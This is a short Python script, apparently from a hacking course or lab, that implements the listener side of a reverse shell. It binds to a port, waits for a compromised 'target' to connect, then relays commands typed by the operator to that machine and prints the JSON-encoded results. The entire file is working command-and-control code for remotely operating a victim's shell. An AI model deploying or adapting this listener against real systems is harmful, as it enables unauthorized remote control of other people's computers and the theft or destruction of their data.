import socket
import json
import os


def sender(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def receiver():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def target_communication():
    while True:
        command = input(f"* Shell~{ip}: ")
        sender(command)
        if command == "quit":
            break
        elif command == "clear":
            os.system("clear")
        elif command[:3] == "cd ":
            pass
        else:
            result = receiver()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("10.0.2.15", 5555))
print("[+] Listening for Incoming Connections")
sock.listen(5)
target, ip = sock.accept()
print(f"[+] Target Connected From: {str(ip)}")
target_communication()
